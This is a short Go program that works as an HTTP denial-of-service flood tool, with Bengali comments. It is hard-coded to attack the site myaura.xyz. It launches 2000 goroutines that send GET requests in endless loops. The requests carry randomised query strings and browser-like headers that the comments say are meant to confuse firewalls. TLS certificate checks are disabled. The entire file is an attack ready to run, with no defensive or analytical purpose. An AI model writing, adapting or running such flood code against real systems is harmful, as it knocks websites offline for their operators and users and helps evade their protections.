package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
	"math/rand"
	"golang.org/x/net/http2"
)

func main() {
	target := "https://myaura.xyz/" // টার্গেট সাইট
	threads := 2000 // কোলাবে ২০০০ থ্রেড আরামসে চলবে

	// ১. HTTP/2 ট্রান্সপোর্ট কনফিগার করা (পাওয়ারফুল মেথড)
	transport := &http2.Transport{
		AllowHTTP: true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	fmt.Println("🔥 Vortex Raw Power Active | Mode: Proxy-Less | Target: myaura.xyz")

	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// ২. র্যান্ডম কুয়েরি এবং হেডার তৈরি যাতে ফায়ারওয়াল কনফিউজ হয়
				url := fmt.Sprintf("%s?vortex=%d&samir=%d", target, rand.Intn(1000000), id)
				
				req, _ := http.NewRequest("GET", url, nil)
				
				// হেডারগুলোকে ব্রাউজারের মতো সাজানো
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err == nil {
					if id == 0 {
						fmt.Printf("📡 Status: %d | Power: Maximum\n", resp.StatusCode)
					}
					resp.Body.Close()
				} else {
					// সার্ভার যদি কানেকশন ড্রপ করে, তবে ১ মিলি-সেকেন্ড অপেক্ষা করবে
					time.Sleep(1 * time.Millisecond)
				}
			}
		}(i)
	}

	// ইঞ্জিনকে থামতে না দেওয়া
	select {}
}
